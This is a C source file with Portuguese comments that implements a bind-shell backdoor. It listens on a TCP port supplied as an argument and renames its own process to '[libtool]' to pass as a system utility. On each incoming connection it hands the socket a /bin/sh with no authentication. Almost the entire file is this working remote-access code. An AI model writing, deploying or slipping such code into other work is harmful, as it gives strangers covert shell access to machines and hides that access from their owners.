#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <signal.h>

// #include "../headers/sock_ng.h"
#include "shell_fnct.h"
#include "exceptionss.h"
#include "dump_io.h"

#define BACKLOG 5
#define TRUE    1
#define FALSE   0

int main(int argc, char ** argv){
  int sockfd;                      // descritor de arquivos para socket;
  int newsockfd;                   // just another one;
  
  socklen_t sin_size;              // mais tarde explico;

  struct sockaddr_in host_addr;    // strutura do servidor
  struct sockaddr_in client_addr;  // estrutura do cliente;

  int opt;   
  int forkpid_one;
  int forkpid_two;

  int port;                        // variável que vai receber argv[1]
                                   // convertido para inteiro. (é a porta)
  int yes = 1;

  char * const sh[] = { "/bin/sh", NULL };

  sin_size = sizeof(struct sockaddr_in);

  if(argc < 2){
    printf("Usage: %s <port>\n", argv[0]); // tratamento de erro.
    exit(1);
  }

  port = atoi(argv[1]); // conversão de **char  para int e atribuindo a variável

  if((sockfd = socket(PF_INET, SOCK_STREAM, 0)) < 0){  // criando o socket;
    fatal("creating the socket");                      // tratamento de erros;
  }

  if(setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int)) < 0){ 
    fatal("in setsockopt()"); 
  }

  host_addr.sin_family = AF_INET;
  host_addr.sin_port = htons(port);
  host_addr.sin_addr.s_addr = INADDR_ANY;
  memset(&(host_addr.sin_zero), '\0', 8);

  if(bind(sockfd, (struct sockaddr *)&host_addr, sizeof(struct sockaddr_in)) < 0){ // abrindo a porta e colocando o socket nela;
    fatal("binding to socket");                                                    // tratamento de erros;
  }

  if(listen(sockfd, BACKLOG) < 0){                                                 // fazendo com que ele fique escutando na porta
    fatal("listening from socket");                                                // tratamento de erros;	
  }
  forkpid_one = fork();
  if(forkpid_one){
    strcpy(argv[0], "[libtool]");
    signal(SIGCHLD, SIG_IGN);
    while(TRUE){
      newsockfd = accept(sockfd, (struct sockaddr*)&client_addr, &sin_size);
      if(newsockfd < 0){
	fatal("accepting connection");
      }else{
	forkpid_two = fork();
	if(forkpid_two){
	  printf("Teste\n");
	  dup2(newsockfd, 2); dup2(newsockfd, 1); dup2(newsockfd,0);
	  execve(sh[0], sh, NULL);
	}
      }
    }
  }
  printf("\nFine!\n");
  return 0;  
}
